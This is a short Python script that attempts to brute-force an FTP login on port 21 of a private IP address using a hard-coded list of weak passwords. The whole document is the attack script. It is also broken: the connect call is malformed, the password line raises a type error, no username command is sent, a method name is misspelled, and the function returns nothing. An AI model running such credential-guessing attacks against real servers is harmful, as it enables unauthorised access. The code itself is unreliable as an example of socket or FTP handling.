import socket
import re
import sys

def connection(ip, user, passw):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Trying " +ip+ ":"+user+":passw")
    sock.connect(ip,21)
    data = sock.recv(1024)
    sock.send("pass" + passw *"\r\n")
    data = sock.recv(1024)
    sock.send("Quit \r\n")
    sock.clos()


user = ""
passwords = ["test", "test1", "test2", "test3"]

for i in passwords:
    attemp = connection("192.168.190.175",user, i)
    print(attemp)